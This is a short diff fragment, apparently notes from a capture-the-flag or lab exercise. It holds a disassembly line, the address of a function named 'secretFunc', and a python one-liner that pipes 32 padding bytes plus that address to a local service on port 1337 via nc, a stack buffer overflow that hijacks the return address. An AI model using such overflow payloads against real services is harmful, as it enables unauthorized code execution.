@@ -1,0 +1,4 @@
+804889c:       8d 45 e4                lea    -0x1c(%ebp),%eax
+080487ed <secretFunc>:
+python -c "print '\x01'*32+'\xed\x87\x04\x08'" | nc localhost 1337
+
